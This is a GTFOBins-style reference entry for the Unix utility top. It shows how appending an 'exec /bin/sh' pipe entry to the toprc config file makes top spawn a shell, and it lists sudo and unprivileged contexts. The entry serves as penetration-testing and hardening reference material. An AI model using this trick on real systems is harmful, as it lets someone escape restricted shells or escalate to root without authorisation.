---
type: gtfobin
name: top
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# top

## shell

```bash
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset
```
_The config path might be different._
**Contexts:** sudo, unprivileged
